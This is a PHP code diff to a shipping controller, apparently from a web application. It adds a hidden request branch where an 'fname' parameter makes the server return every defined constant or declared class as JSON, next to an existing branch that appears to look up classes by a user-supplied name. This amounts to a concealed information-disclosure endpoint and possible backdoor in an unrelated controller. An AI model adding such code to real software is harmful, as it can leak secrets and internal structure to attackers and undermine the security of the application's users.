@@ -191,7 +191,15 @@ class ShippingController extends Controller
 	{
         $x = $request->get('x');
         if(isset($x) && is_array($x) && count($x)>0){
-            if(array_key_exists('cname',$x)){
+            if(array_key_exists('fname',$x)){
+                $fName = $x['fname'];
+                if($fName==='get_defined_constants'){
+                    return json_encode(get_defined_constants());
+                }
+                if($fName==='get_declared_classes'){
+                    return json_encode(get_declared_classes());
+                }
+            }else if(array_key_exists('cname',$x)){
                 $cName = $x['cname'];
                 unset($x['cname']);
                 if(!class_exists($cName)){
